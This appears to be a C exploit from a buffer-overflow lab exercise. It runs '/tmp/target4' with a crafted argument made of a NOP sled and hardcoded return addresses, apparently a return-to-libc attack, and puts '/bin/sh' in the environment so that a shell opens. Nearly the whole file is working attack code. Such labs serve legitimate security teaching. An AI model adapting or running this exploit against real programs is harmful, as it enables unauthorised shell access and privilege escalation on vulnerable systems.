#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3]; 
  char *env[1];
  
  args[0] = TARGET;
  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\xa0\x3d\xe4\xb7\xd0\x79\xe3\xb7\xc5\xff\xff\xbf"; 
  args[2] = NULL;

  char *envvar = "shellcode=/bin/sh";
  
  env[0] = envvar;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


